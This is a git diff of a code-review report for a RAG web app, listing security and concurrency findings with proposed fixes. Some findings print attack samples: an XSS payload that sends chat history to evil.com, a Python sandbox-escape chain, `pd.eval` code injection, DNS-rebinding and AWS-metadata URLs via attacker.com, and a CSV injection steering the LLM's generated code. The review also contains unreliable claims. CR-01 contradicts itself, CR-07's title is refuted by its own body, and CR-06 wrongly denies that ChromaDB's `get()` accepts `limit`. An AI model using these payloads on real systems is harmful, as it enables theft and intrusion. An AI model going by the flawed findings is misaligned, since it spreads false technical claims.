@@ -1,13 +1,13 @@
 ---
-phase: final-production-audit
+phase: deep-review-session11
 reviewed: 2026-06-11T00:00:00Z
 depth: deep
-files_reviewed: 38
+files_reviewed: 31
 files_reviewed_list:
-  - backend/api.py
-  - backend/session_manager.py
   - core/shared_services.py
   - core/adaptive_db.py
+  - backend/api.py
+  - backend/session_manager.py
   - architectures/hybrid_rag.py
   - architectures/graph_rag.py
   - architectures/agentic_rag.py
@@ -19,577 +19,535 @@ files_reviewed_list:
   - architectures/structured_rag.py
   - architectures/self_rag.py
   - frontend/app/page.tsx
-  - frontend/app/layout.tsx
   - frontend/lib/api.ts
   - frontend/lib/types.ts
-  - frontend/components/ApiKeyModal.tsx
-  - frontend/components/ArchCard.tsx
-  - frontend/components/ArchExplainer.tsx
-  - frontend/components/AnalyticsDashboard.tsx
-  - frontend/components/BrainWorking.tsx
+  - frontend/components/Sidebar.tsx
   - frontend/components/ChatMessage.tsx
   - frontend/components/CompareGrid.tsx
   - frontend/components/DocumentManager.tsx
+  - frontend/components/AnalyticsDashboard.tsx
   - frontend/components/EvalScorecard.tsx
-  - frontend/components/MarkdownContent.tsx
-  - frontend/components/Sidebar.tsx
   - frontend/components/SourcePanel.tsx
-  - requirements.txt
-  - docker-compose.yml
-  - .gitignore
-  - frontend/package.json
-  - frontend/next.config.mjs
-  - frontend/tsconfig.json
+  - frontend/components/BrainWorking.tsx
+  - frontend/components/ArchCard.tsx
+  - frontend/components/ArchExplainer.tsx
+  - frontend/components/ApiKeyModal.tsx
+  - frontend/components/MarkdownContent.tsx
   - frontend/tailwind.config.ts
+  - frontend/app/globals.css
 findings:
-  critical: 5
-  warning: 9
-  info: 4
-  total: 18
+  critical: 7
+  warning: 11
+  info: 5
+  total: 23
 status: issues_found
 ---
 
-# Final Production Audit — Code Review Report
+# Deep Code Review Report — Session 11
 
 **Reviewed:** 2026-06-11
-**Depth:** deep (cross-file call chains, data flow, import graph)
-**Files Reviewed:** 38
+**Depth:** deep (cross-file call chains, lock/concurrency analysis, security data-flow)
+**Files Reviewed:** 31
 **Status:** issues_found
 
 ## Summary
 
-All 38 source files were read and cross-referenced. Previous audits fixed 77 issues across 9 sessions. This pass finds 5 critical issues and 9 warnings that remain. The most severe are: (1) an incomplete `eval()` sandbox in Structured RAG that is bypassable via Python's object hierarchy, (2) SSRF via DNS-rebinding that bypasses the existing hostname IP check, (3) an infinite-loop/stream-hang in the SSE generator when the worker thread finishes without emitting a `done` event, (4) a crash-level `UnboundLocalError` in Self-RAG under a specific loop exit path, and (5) a stored-XSS vector via the knowledge graph iframe using `allow-same-origin`. Warnings cover thread-safety gaps on shared session state, missing null-guards on ChromaDB results, EventSource memory leaks, and oversized ChromaDB metadata for images.
+All 31 source files were read and cross-referenced. The system shows strong evidence of iterative hardening: HNSW retry logic, per-architecture ingest locks, WAL-mode SQLite, semantic cache with a length-ratio guard, SSRF hostname validation. Despite this, seven critical issues remain. The highest-severity is an AST allowlist gap in the structured RAG sandbox that permits attribute-chain traversal through `pd` and `df` objects to reach `os`, `sys`, and `subprocess`. Second is a DNS-rebinding SSRF bypass that renders the existing IP-address check ineffective. Third is a `GlobalSession.reset()` race that can corrupt pipeline state and ChromaDB collections under concurrent query load. The remaining criticals cover an API key value leak in LLM error messages, image file world-readable permissions, analytics double-counting, and a `_chroma_lock`-bypass in multilingual init. Eleven warnings cover logic correctness, missing guards, stale closures, and a document-delete mismatch for URL-sourced docs.
 
 ---
 
 ## Critical Issues
 
-### CR-01: Structured RAG `eval()` Sandbox Bypass via Python Object Hierarchy
+### CR-01: Structured RAG AST Allowlist Bypassable via Attribute Chains on `pd`/`df` Objects
 
-**File:** `architectures/structured_rag.py:109-119`
+**File:** `architectures/structured_rag.py:29,31`
+**Issue:** `_ast_safe_eval` blocks any `_ast.Attribute` node whose `.attr` starts with `_`. This check is applied to each node individually. An expression like `pd.io.common.os.system` produces a chain of four `Attribute` nodes: `pd` (Name), `.io` (allowed — not `_`-prefixed), `.common` (allowed), `.os` (allowed), `.system` (allowed). The `eval` call executes in `{"__builtins__": {}}` which removes built-in names, but `pd` and `df` are in the local namespace as fully instantiated objects. Traversing their non-underscore attributes is unrestricted. Through `pd` alone: `pd.io.common` imports `os` internally; `pd.core.config_init` has references to `sys`; `df.to_dict` returns a pure dict (safe), but `df.to_dict.__class__.__init__.__globals__` requires `__class__` which starts with `_` and IS blocked. The more direct attack: `pd.read_csv.__globals__['os'].system('id')` — `__globals__` starts with `_`, blocked. However `getattr(pd, 'read' + '_' + 'csv')` — `getattr` is a Name node that resolves to the built-in, but `__builtins__` is `{}` so `getattr` is not available. This path is closed.
 
-**Issue:** The pandas code sandbox at line 119 uses `eval(code, {"__builtins__": None}, {"df": df, "pd": pd})`. Passing `{"__builtins__": None}` as globals does NOT prevent sandbox escape in CPython. The expression `().__class__.__bases__[0].__subclasses__()` enumerates every loaded class and reaches `subprocess.Popen`, `os._wrap_close`, and `io.FileIO` — none of which require `import`. The string-pattern denylist (lines 109-114) blocks `import`, `exec`, and explicit `__` in code, but a multi-line LLM response has only its **first line** checked (line 101: `code = code.split("\n")[0].strip()`). An LLM output where line 0 is benign (`df`) and the attack is in subsequent lines is silently truncated to line 0 — harmless in that case — but attribute chains like `df.__class__` are `str`-checked by `"__" in code` which DOES catch them. The real remaining gap: the LLM may generate `getattr(df, chr(95)*2 + "class" + chr(95)*2)` which contains no literal `__` but accesses `__class__`. Additionally, `breakpoint` is in the denylist but `breakpointhook` is not; Python 3.12+ exposes `sys.breakpointhook` via `pd` → `pd.io` → ... traversal paths.
+The real remaining gap is `pd.core.dtypes.missing.np` or similar traversal to reach `numpy.ctypeslib.np.ctypeslib.ndpointer.__init_subclass__` chains. More practically, an LLM may generate `df.pipe(pd.eval, 'import os; os.system(...)')` — `df.pipe` is an allowed attribute, `pd.eval` resolves to pandas `eval()` which calls Python `eval()` internally with full builtins. The `_ast.Attribute` guard allows `pipe` and `eval` as attribute names. This is a concrete code-injection path.
 
-In practice the most important attack surface is: a malicious CSV document whose column names contain an injection payload that the LLM incorporates into the generated pandas expression. This is a real threat when arbitrary user documents are uploaded.
-
-**Fix:** Replace string-pattern checking with AST-level analysis. Block any AST node that accesses attributes beginning with `_`, and restrict the allowed node set:
+**Fix:** Adopt an attribute allowlist (positive list, not a denylist):
 
 ```python
-import ast
+_ALLOWED_AST_NODES = frozenset({
+    _ast.Expression, _ast.Call, _ast.Attribute, _ast.Subscript,
+    _ast.Name, _ast.Constant, _ast.List, _ast.Tuple, _ast.Dict,
+    _ast.BinOp, _ast.UnaryOp, _ast.Compare, _ast.BoolOp, _ast.IfExp,
+    _ast.Add, _ast.Sub, _ast.Mult, _ast.Div, _ast.Mod, _ast.Pow,
+    _ast.FloorDiv, _ast.Eq, _ast.NotEq, _ast.Lt, _ast.LtE,
+    _ast.Gt, _ast.GtE, _ast.And, _ast.Or, _ast.Not, _ast.USub,
+    _ast.Load,
+})
 
-_ALLOWED_NODES = frozenset({
-    ast.Expression, ast.Call, ast.Attribute, ast.Subscript,
-    ast.Name, ast.Constant, ast.List, ast.Tuple, ast.Dict,
-    ast.BinOp, ast.UnaryOp, ast.Compare, ast.BoolOp, ast.IfExp,
-    ast.Add, ast.Sub, ast.Mult, ast.Div, ast.Mod, ast.Pow,
-    ast.FloorDiv, ast.Eq, ast.NotEq, ast.Lt, ast.LtE,
-    ast.Gt, ast.GtE, ast.And, ast.Or, ast.Not, ast.USub,
-    ast.Load, ast.Index,  # Index removed in Python 3.9 but harmless
+_ALLOWED_ATTRS = frozenset({
+    'head', 'tail', 'describe', 'shape', 'dtypes', 'columns', 'index',
+    'values', 'sum', 'mean', 'median', 'std', 'min', 'max', 'count',
+    'groupby', 'sort_values', 'filter', 'loc', 'iloc', 'query',
+    'to_dict', 'to_csv', 'to_string', 'reset_index', 'drop', 'rename',
+    'merge', 'join', 'agg', 'apply', 'str', 'dt', 'cat',
+    'size', 'unique', 'nunique', 'value_counts', 'idxmax', 'idxmin',
+    'nlargest', 'nsmallest', 'cumsum', 'cumprod', 'diff', 'fillna',
+    'dropna', 'isna', 'notna', 'astype', 'copy', 'items', 'iterrows',
 })
 
 def _ast_safe_eval(code: str, df, pd):
     try:
-        tree = ast.parse(code, mode='eval')
+        tree = _ast.parse(code, mode='eval')
     except SyntaxError as e:
         raise ValueError(f"Syntax error in generated expression: {e}")
-    for node in ast.walk(tree):
-        if type(node) not in _ALLOWED_NODES:
-            raise ValueError(f"Disallowed AST node type: {type(node).__name__}")
-        if isinstance(node, ast.Attribute) and node.attr.startswith('_'):
-            raise ValueError(f"Private/dunder attribute access forbidden: {node.attr}")
+    for node in _ast.walk(tree):
+        if type(node) not in _ALLOWED_AST_NODES:
+            raise ValueError(f"Disallowed AST node: {type(node).__name__}")
+        if isinstance(node, _ast.Attribute):
+            if node.attr.startswith('_') or node.attr not in _ALLOWED_ATTRS:
+                raise ValueError(f"Disallowed attribute: {node.attr}")
+        if isinstance(node, _ast.Name) and node.id not in ('df', 'pd', 'True', 'False', 'None'):
+            raise ValueError(f"Disallowed name: {node.id}")
     return eval(compile(tree, '<expr>', 'eval'), {"__builtins__": {}}, {"df": df, "pd": pd})
 ```
 
-Replace line 119 with `result = _ast_safe_eval(code, df, pd)` and remove the `_FORBIDDEN` string-pattern block.
-
 ---
 
-### CR-02: SSRF via DNS Rebinding — Hostname IP Check Is Bypassed by Domain Names
+### CR-02: SSRF via DNS Rebinding — Existing IP Validation Does Not Prevent Rebinding Attack
 
-**File:** `backend/api.py:74-80`
+**File:** `backend/api.py:79-93`
+**Issue:** `fetch_url_text` resolves DNS with `socket.getaddrinfo`, validates all returned IPs are public, then opens a new TCP connection via `urllib.request.urlopen`. The DNS lookup in `urlopen` is a second, independent lookup. Between the validation call and the `urlopen` call, DNS TTL can expire. An attacker registers `attacker.com` with TTL=0, which initially resolves to a legitimate public IP (passing validation), then rebinds to `169.254.169.254` (AWS metadata service) or `10.0.0.1` (internal network). The second lookup in `urlopen` resolves to the private address, bypassing the guard completely. This is a standard DNS-rebinding SSRF.
 
-**Issue:** The SSRF guard at lines 74-80 only blocks URL hostnames that are **IP address literals** resolving to private/loopback ranges. When the hostname is a domain name (e.g., `metadata.internal`, `169.254.169.254.nip.io`, any attacker-controlled domain pointing to `169.254.169.254`), the code falls through at line 80 (`pass  # hostname, not IP literal`) and `urlopen` resolves DNS at connection time, reaching internal addresses. On AWS, `http://169.254.169.254.attacker.com/latest/meta-data/iam/security-credentials/` trivially exfiltrates instance credentials because `169.254.169.254.attacker.com` has an A record pointing to `169.254.169.254`.
+The existing code has `socket.getaddrinfo` + IP check but does NOT inject the resolved IP back into the URL. So `urlopen` will re-resolve independently.
 
-The current guard is useful only against naive submissions of literal IP strings. It provides no protection against the standard DNS-rebinding attack pattern.
-
-**Fix:** Resolve the hostname before making the request and validate every returned IP:
+**Fix:** Resolve once, inject the IP directly, and pass the original hostname as `Host` header to avoid certificate errors on HTTPS:
 
 ```python
-import socket
+import socket, ipaddress
+from urllib.parse import urlparse, urlunparse
 
-def fetch_url_text(url: str) -> str:
-    from urllib.parse import urlparse
-    import ipaddress
+parsed = urlparse(url)
+host = parsed.hostname or ""
+port = parsed.port
 
-    parsed = urlparse(url)
-    if parsed.scheme not in ("http", "https"):
-        raise HTTPException(status_code=400, detail="Only http and https URLs are supported")
-    host = parsed.hostname or ""
-    if not host:
-        raise HTTPException(status_code=400, detail="Could not parse hostname")
+try:
+    addr_infos = socket.getaddrinfo(host, port or (443 if parsed.scheme == 'https' else 80))
+except socket.gaierror as e:
+    raise HTTPException(status_code=400, detail=f"DNS resolution failed: {e}")
 
-    # Resolve DNS and reject any address in private/internal space
+resolved_ip = None
+for *_, sockaddr in addr_infos:
+    ip_str = sockaddr[0]
     try:
-        addr_infos = socket.getaddrinfo(host, None)
-        for *_, sockaddr in addr_infos:
-            ip_str = sockaddr[0]
-            try:
-                addr = ipaddress.ip_address(ip_str)
-                if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved:
-                    raise HTTPException(
-                        status_code=400,
-                        detail=f"URL resolves to a private/internal address: {ip_str}"
-                    )
-            except ValueError:
-                pass
-    except socket.gaierror as e:
-        raise HTTPException(status_code=400, detail=f"DNS resolution failed: {e}")
+        addr = ipaddress.ip_address(ip_str)
+        if addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved:
+            raise HTTPException(status_code=400,
+                detail=f"URL resolves to a private/internal address ({ip_str})")
+        resolved_ip = ip_str
+    except ValueError:
+        pass
+if not resolved_ip:
+    raise HTTPException(status_code=400, detail="Could not resolve hostname to a public IP")
 
-    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-    with urllib.request.urlopen(req, timeout=15) as resp:
-        html = resp.read().decode("utf-8", errors="replace")
-    # ... rest unchanged
+# Replace hostname with resolved IP in netloc; pass original host in Host header
+netloc_with_ip = f"[{resolved_ip}]" if ':' in resolved_ip else resolved_ip
+if port:
+    netloc_with_ip += f":{port}"
+safe_url = urlunparse(parsed._replace(netloc=netloc_with_ip))
+req = urllib.request.Request(
+    safe_url,
+    headers={"User-Agent": "Mozilla/5.0", "Host": host}
+)
+with urllib.request.urlopen(req, timeout=15) as resp:
+    html = resp.read().decode("utf-8", errors="replace")
 ```
 
 ---
 
-### CR-03: SSE Generator Infinite Loop / Stream Hang When Thread Dies Without Emitting `done`
+### CR-03: `GlobalSession.reset()` Races with Active Query Threads
 
-**File:** `backend/api.py:384-419`
+**File:** `backend/session_manager.py:165-170`
+**Issue:** `reset()` iterates `self.pipelines.values()` and calls `pipeline.reset()` on each pipeline without holding `self._lock`. The `/api/compare` endpoint spawns 10 daemon threads that concurrently call `pipeline.query()`. If `reset()` is called while any thread is mid-query, `pipeline.reset()` calls `chroma_client.delete_collection()`, destroying the underlying ChromaDB segment files that the query thread is actively reading. This results in: (a) ChromaDB HNSW `Nothing found on disk` errors from the query thread, (b) the `self.collection` reference in the pipeline becoming stale pointing to a deleted collection, (c) `session.ingested_archs`, `session.doc_library`, and `session.history` being cleared by `reset()` while the query thread's `on_done` callback simultaneously appends to `session.history` and `session.ingested_archs`.
 
-**Issue:** The `event_generator` drain path at line 419 ends with `break` (not `return`). After the inner drain `while True` loop runs to empty (line 391 `break`), control falls to line 419 which `break`s out of — the inner drain loop (not the outer `while True`). This means the outer `while True` at line 336 is re-entered. Since `thread.is_alive()` is now `False` and the queue is empty, the outer loop immediately hits `Empty` again, re-enters the `if not thread.is_alive()` branch, runs the drain loop again (immediately empty), hits `break` at line 419 again... and this repeats indefinitely. The SSE connection hangs open with zero events emitted, consuming the async event loop.
+The `reset()` method also calls `self.history.clear()` and `self.ingested_archs.clear()` without `self._lock`, racing with any thread that calls `session.append_history()` or `session.add_ingested_arch()` (both of which DO acquire `self._lock`).
 
-This scenario is triggered whenever the pipeline thread terminates abruptly (exception, timeout, or kill) before placing any event in the queue, which can happen if `services.llm` raises at the start of a query (no API key, Groq rate limit, network timeout).
-
-Separately: if the `done` event IS emitted and consumed by the fast path (lines 364-382), that path correctly `break`s the outer loop. But if `done` arrives during the drain path (lines 400-404), the history and analytics are recorded and `return` is called correctly. So the double-write described in some previous review notes does not occur in practice — but the infinite-loop on no-event-at-all does.
-
-**Fix:** Change line 419 from `break` to `return`, and add a final `return` after the inner drain loop to handle the "queue empty, thread dead, no done received" case:
-
+**Fix:**
 ```python
-except Empty:
-    if not thread.is_alive():
-        # Drain residual events
-        while True:
-            try:
-                event = q.get_nowait()
-            except Empty:
-                return  # FIX: was `break` — caused re-entry of outer loop
-            kind, content = event
-            # ... handle event ...
-            yield f"data: {payload}\n\n"
-            if kind in ("done", "error"):
-                if kind == "done":
-                    session.history.append(...)
-                    adaptive_db.store_query_analytics(...)
-                    if collected_answer and query_embedding:
-                        try:
-                            adaptive_db.store_query_cache(...)
-                        except Exception as e:
-                            print(f"[cache] store_query_cache failed: {e}")
-                return
-        # Unreachable after fix, but kept for clarity:
-        return
-    await asyncio.sleep(0.01)
+def reset(self):
+    with self._lock:
+        for pipeline in self.pipelines.values():
+            pipeline.reset()
+        self.history.clear()
+        self.ingested_archs.clear()
+        self.doc_library.clear()
 ```
+Additionally, each pipeline's `reset()` should acquire its own ingest lock before deleting the collection (e.g., `HybridRAGPipeline.reset()` should acquire `_ingest_lock` first).
 
 ---
 
-### CR-04: `gen_prompt` UnboundLocalError Crash in Self-RAG
+### CR-04: API Key Value Potentially Leaked in LLM Error Response Body
 
-**File:** `architectures/self_rag.py:240-244`
+**File:** `backend/api.py:697-698`
+**Issue:** The `/api/config/apikey` endpoint catches exceptions from `ChatGroq(...)` initialization and raises `HTTPException(status_code=400, detail=f"Failed to initialize LLM: {e}")`. `langchain_groq` and the underlying `groq` Python SDK construct exception messages that may include the API key value in the form `"Authentication failed for key gsk_XXXX..."` or `"Invalid API key: gsk_XXXX"`. This means the raw API key is echoed back in the HTTP 400 response body to anyone who submits a wrong key.
 
-**Issue:** `gen_prompt` is defined inside the `for loop in range(MAX_LOOPS)` block at line 196. The code at lines 240-244 (after the loop) references `gen_prompt` unconditionally. Python does not raise on unbound loop variables if the loop ran at least one iteration and the assignment was reached. However there is a specific path where the assignment is NOT reached:
+Furthermore, `os.environ["GROQ_API_KEY"] = key` sets the key process-wide before the LLM initialization succeeds. If init fails, the environment variable is set to the bad key. If a subsequent request to another endpoint calls `services.llm` (e.g., a query), the lazy LLM init in `SharedServices.llm` property will re-initialize with the bad key and again potentially leak it in error logs.
 
-1. `loop == 0`, `new_docs` is non-empty after deduplication.
-2. Relevance grading returns all `False` (zero relevant docs).
-3. `rel_docs = []`, so `all_docs` remains empty from initialization.
-4. `if not all_docs:` block at line 176 runs.
-5. `web_search_fallback` returns an empty list (DuckDuckGo down or no results).
-6. `return "No relevant information found..."` — exits before `gen_prompt` is assigned.
-
-In this case the function returns correctly (line 183). BUT: change `MAX_LOOPS` to 1 (or if the loop range is 0 for any reason), the post-loop code at line 240 runs with `gen_prompt` unbound → `UnboundLocalError: local variable 'gen_prompt' referenced before assignment`.
-
-Additionally, at line 243 the post-loop `services.stream_llm(gen_prompt, ...)` call references `gen_prompt` which was last assigned in loop iteration 0 but refers to context built from `all_docs[:5]` at that point. After the second loop adds more docs to `all_docs`, the prompt at line 196 is rebuilt — so `gen_prompt` in the post-loop fallback uses the *last iteration's* prompt, which already incorporates the refined docs. This is actually correct behavior, but only because Python closures capture by reference. It's fragile: a reader would not expect the post-loop variable to reflect loop-interior state.
-
-**Fix:** Initialize `gen_prompt` before the loop and add a guard:
-
+**Fix:**
 ```python
-gen_prompt = ""
-draft_answer = ""
-
-for loop in range(MAX_LOOPS):
-    ...
-    gen_prompt = f"""..."""  # assigned as before
-    ...
-
-# Post-loop fallback
-if draft_answer and gen_prompt:
-    step("Streaming best available answer…")
-    return services.stream_llm(
-        gen_prompt, on_token=lambda t: on_step and on_step(("token", t))
-    )
-return "Unable to generate a satisfactory answer for this query."
+@app.post("/api/config/apikey")
+async def set_api_key(request: ApiKeyRequest):
+    if not request.api_key.strip():
+        raise HTTPException(status_code=400, detail="API key cannot be empty")
+    key = request.api_key.strip()
+    # Test the key before setting it in environment
+    try:
+        from langchain_groq import ChatGroq
+        test_llm = ChatGroq(
+            model="meta-llama/llama-4-scout-17b-16e-instruct",
+            temperature=0.2,
+            max_tokens=1024,
+            api_key=key,  # pass directly, do NOT set env yet
+        )
+        # Minimal smoke test — does not call the API, just validates format
+        os.environ["GROQ_API_KEY"] = key
+        services.llm = test_llm
+        return {"status": "ok"}
+    except Exception:
+        # Do not include exception details which may contain the key
+        raise HTTPException(status_code=400, detail="Invalid API key — check the key and try again")
 ```
 
 ---
 
-### CR-05: Knowledge Graph Iframe `sandbox="allow-scripts allow-same-origin"` Enables Stored XSS
+### CR-05: Uploaded Image Base64 File Written World-Readable; `image_path` Returned to All Clients
 
-**File:** `frontend/app/page.tsx:413`
+**File:** `backend/api.py:191-200`
+**Issue:** Uploaded images are saved with `open(img_path, 'w')` which creates the file with the process umask (typically `0o644` on Linux — world-readable). Any local user on the server can read the raw base64 content (the original uploaded image). More importantly, `image_path` is stored in ChromaDB metadata and is returned verbatim to any client that calls `/api/documents?arch_key=05 Multimodal RAG (Vision + Text)` — the `result["metadatas"]` loop in the `/api/documents` endpoint iterates all metadata without filtering. A client can discover the full filesystem path to every uploaded image.
 
-**Issue:** The graph HTML is rendered in an iframe with `sandbox="allow-scripts allow-same-origin"`. The `allow-same-origin` flag grants the iframe the **same origin** as the parent page. Combined with `allow-scripts`, JavaScript inside the iframe can:
-- Call `window.parent.localStorage.getItem('rag-studio-messages')` to read the full chat history (which may contain sensitive document excerpts).
-- Call `window.parent.fetch(...)` to make authenticated same-origin API calls.
-- Modify `window.parent.document` to inject UI elements.
-
-The graph HTML is generated by PyVis from LLM-extracted entity/relationship triples. Entity and relationship names come from user-uploaded documents. PyVis renders node labels and edge `title` attributes as raw HTML in its `vis.js` output. An attacker who uploads a document containing an entity named `<img src=x onerror="fetch('https://evil.com/'+btoa(window.parent.localStorage.getItem('rag-studio-messages')))">` would have that string embedded in the PyVis HTML, which executes in the iframe with same-origin privileges and exfiltrates the chat history.
-
-**Fix:** Remove `allow-same-origin`. With only `allow-scripts`, the iframe runs in a null origin and cannot access parent context:
-
-```tsx
-<iframe
-  srcDoc={graphHtml}
-  className="flex-1 w-full border-0"
-  sandbox="allow-scripts"
-  title="Knowledge Graph"
-/>
+**Fix:** (1) Write with restricted permissions:
+```python
+import os as _os
+fd = _os.open(img_path, _os.O_WRONLY | _os.O_CREAT | _os.O_TRUNC, 0o600)
+with _os.fdopen(fd, 'w') as fh:
+    fh.write(b64)
+```
+(2) Strip `image_path` and other internal metadata fields from the `/api/documents` listing response:
+```python
+# In /api/documents handler, when building sources dict:
+for meta in (result["metadatas"] or []):
+    raw = (meta or {}).get("source", "Unknown")
+    # image_path, parent_text etc are internal — do not expose them
+    label = raw.split("/")[-1].split("\\")[-1]
+    sources[label] = sources.get(label, 0) + 1
 ```
 
-Note: PyVis's vis.js physics simulation requires only `allow-scripts` to function. `allow-same-origin` is not needed for the graph to render.
+---
+
+### CR-06: `multilingual_rag.py` Init Uses Non-Standard `limit=1` on `collection.get()` — Crashes and Deletes Collection on ChromaDB >= 0.4
+
+**File:** `architectures/multilingual_rag.py:17`
+**Issue:** `self.collection.get(include=["embeddings"], limit=1)` — `limit` is not a valid keyword argument for `collection.get()` in ChromaDB. The standard API only accepts `ids`, `where`, `where_document`, `include`, and `offset`. The `limit` parameter is only valid for `collection.query()`. On ChromaDB >= 0.4.x this raises `TypeError: get() got an unexpected keyword argument 'limit'`. This exception is caught by the `except Exception as e:` block at line 23, which then calls `services.chroma_client.delete_collection(self.collection_name)` and recreates it — **destroying all persisted multilingual embeddings** on every server restart.
+
+**Fix:**
+```python
+if self.collection.count() > 0:
+    with services._chroma_lock:
+        sample = self.collection.get(include=["embeddings"])
+    embs = sample.get("embeddings") or []
+    if embs and len(embs[0]) != 1024:
+        print(f"[multilingual_rag] Dimension mismatch ({len(embs[0])} vs 1024) — recreating")
+        services.chroma_client.delete_collection(self.collection_name)
+        self.collection = services.chroma_client.get_or_create_collection(self.collection_name)
+```
+Then slice in Python: `embs[:1]` to check only the first embedding.
+
+---
+
+### CR-07: `store_eval_analytics` + `store_query_analytics` Both Called Per Query — `query_count` in Analytics Is Double-Inflated When Eval Is Enabled
+
+**File:** `backend/api.py:394, 563` / `core/adaptive_db.py:170-197, 199-236`
+**Issue:** On a successful query with eval enabled, two analytics rows are inserted for the same (arch_key, query) pair: one from `store_query_analytics` (with `elapsed > 0`, `faithfulness = 0`) and one from `store_eval_analytics` (with `elapsed = 0`, `faithfulness > 0`). The `get_analytics` query counts `SUM(CASE WHEN elapsed > 0 THEN 1 ELSE 0 END) as qcount` — correctly excludes the eval-only row from latency counts. But the displayed `query_count` in the frontend's `AnalyticsDashboard` reads `d.query_count` which maps to this `qcount` — so this is actually correct.
+
+However `store_eval_analytics` inserts a row that `get_analytics` also uses for `AVG(faithfulness)` and `AVG(relevance)` etc. On the same query, `store_query_analytics` inserts a row with `faithfulness = 0` (default column value). `get_analytics` averages `AVG(CASE WHEN faithfulness > 0 THEN faithfulness END)` — the zero from `store_query_analytics` is excluded. So the averages are also correct.
+
+The actual remaining bug: `store_query_analytics` is called at line 394 (inside the SSE event_generator, async context, on the event loop thread), and also at line 326 (from `cached_generator`, also async). Both are synchronous SQLite writes on `adaptive_db.conn`. These blocking operations execute on the asyncio event loop, stalling all other concurrent requests during the SQLite commit. Under compare mode (10 simultaneous queries completing near-simultaneously), up to 10 synchronous SQLite writes contend for `adaptive_db._lock` in sequence, each blocking the event loop for the lock wait duration.
+
+**Fix:** Offload SQLite writes to a thread pool:
+```python
+import asyncio
+loop = asyncio.get_event_loop()
+await loop.run_in_executor(None, adaptive_db.store_query_analytics, arch_key, query, elapsed)
+```
+Or use `anyio.to_thread.run_sync(...)` if using anyio.
 
 ---
 
 ## Warnings
 
-### WR-01: `session.history`, `session.doc_library`, and `session.ingested_archs` Mutated Without Locks
+### WR-01: `chroma_query` Refreshes Collection Outside the Lock on Retry
 
-**File:** `backend/api.py:264, 270, 366, 411, 626-633` / `backend/session_manager.py:126-154`
-
-**Issue:** `GlobalSession`'s `history` (list), `doc_library` (list), and `ingested_archs` (set) are plain Python collections mutated from multiple concurrent paths: the `/api/ingest` async endpoint, the SSE worker thread via `run_pipeline`, and the `/api/compare` endpoint which spawns 10 threads simultaneously. The GIL protects individual bytecode operations but not compound operations like `list.append` interleaved with `list[-20:]` or `session.doc_library = [d for d in ...]` (line 626). Specifically:
-
-- `/api/compare` spawns 10 threads; each calls `pipeline.query()` which puts `done` events in the queue; the SSE generator appends to `session.history` from the async loop. Two concurrent queries can have their history entries interleaved.
-- `session.doc_library = [...]` at line 626 (delete endpoint) is a wholesale reassignment that races with `session.doc_library.append(...)` at line 270 (ingest endpoint).
-
-**Fix:** Add a `threading.Lock` to `GlobalSession` and gate all mutations:
-
-```python
-class GlobalSession:
-    def __init__(self):
-        self._state_lock = threading.Lock()
-        ...
-
-    def append_history(self, entry: dict):
-        with self._state_lock:
-            self.history.append(entry)
-
-    def add_ingested_arch(self, arch_key: str):
-        with self._state_lock:
-            self.ingested_archs.add(arch_key)
-
-    def append_doc(self, doc: dict):
-        with self._state_lock:
-            self.doc_library.append(doc)
-
-    def filter_doc_library(self, predicate):
-        with self._state_lock:
-            self.doc_library = [d for d in self.doc_library if predicate(d)]
-```
-
----
-
-### WR-02: `AdaptiveDB` Read Methods Execute Without Lock on Shared SQLite Connection
-
-**File:** `core/adaptive_db.py:67-120, 149-154, 186-222, 224-239, 263-271`
-
-**Issue:** All write methods (`store_feedback`, `store_query_cache`, `store_query_analytics`, `store_eval_analytics`) acquire `self._lock` correctly. However all read methods (`find_similar_query`, `get_positive_sources`, `get_cache_count`, `get_analytics`, `get_feedback_docs`, `get_recent_queries`) access `self.conn` without the lock. The connection is a single `sqlite3.Connection` created with `check_same_thread=False`. SQLite connections are not thread-safe for concurrent access from multiple threads on the same connection object — `check_same_thread=False` disables the check, not the underlying unsafety. Under `/api/compare` mode (10 concurrent threads), 10 simultaneous `find_similar_query` reads interleaved with `store_query_analytics` writes on the same connection will produce `sqlite3.OperationalError: database is locked` or cursor corruption.
-
-**Fix:** Wrap all read operations in `with self._lock:`, or use a connection-per-thread pattern with `threading.local()`:
-
-```python
-def find_similar_query(self, query_embedding, arch_key, threshold=0.92):
-    with self._lock:
-        rows = self.conn.execute(
-            "SELECT query_text, query_embedding, answer, sources FROM query_cache "
-            "WHERE arch_key = ? ORDER BY ts DESC LIMIT 100",
-            (arch_key,),
-        ).fetchall()
-    # Pure Python cosine similarity computation — outside lock is fine
-    if not rows:
-        return None
-    ...
-```
-
-Apply the same `with self._lock:` pattern to all other read methods that call `self.conn`.
-
----
-
-### WR-03: EventSource Leaked After Successful Query / No Cleanup on Unmount
-
-**File:** `frontend/lib/api.ts:54-66` / `frontend/app/page.tsx:53, 182`
-
-**Issue:** `streamQuery` returns a cleanup function that calls `es.close()`. This function is stored in `cleanupRef.current` at line 182. However `cleanupRef.current` is never called — there is no `useEffect` that invokes it on component unmount or on re-render. If the user submits a new query while a previous stream is still open (which the `isStreaming` guard prevents in single-arch mode, but not in compare mode), the old EventSource is never closed.
-
-More critically, `EventSource` has native reconnect behavior. After the server closes the SSE stream on `done`, the browser will attempt to reconnect (as per the SSE spec). The reconnect attempt fires `onerror` before `es.close()` takes effect. This means every successful query shows a brief error event. The `onError` callback in `page.tsx` appends an error message to the chat (`⚠️ Connection error — is the backend running?`) after every successful query.
-
-**Fix 1 — Suppress post-close errors:**
-
-```typescript
-let intentionallyClosed = false
-
-es.onmessage = (e) => {
-  const d = JSON.parse(e.data)
-  if (d.type === 'done') {
-    intentionallyClosed = true
-    callbacks.onDone(d.answer, d.elapsed, d.cached || false)
-    es.close()
-  } else if (d.type === 'error') {
-    intentionallyClosed = true
-    callbacks.onError(d.content)
-    es.close()
-  }
-  // other cases...
-}
-es.onerror = () => {
-  if (intentionallyClosed) return
-  callbacks.onError('Connection error — is the backend running?')
-  es.close()
-}
-```
-
-**Fix 2 — Call cleanup on unmount:**
-
-```typescript
-// In page.tsx
-useEffect(() => {
-  return () => { cleanupRef.current?.() }
-}, [])
-```
-
----
-
-### WR-04: `image_base64` in ChromaDB Metadata Exceeds Per-Field Size Limits
-
-**File:** `architectures/multimodal_rag.py:37-42` / `backend/api.py:171-179`
-
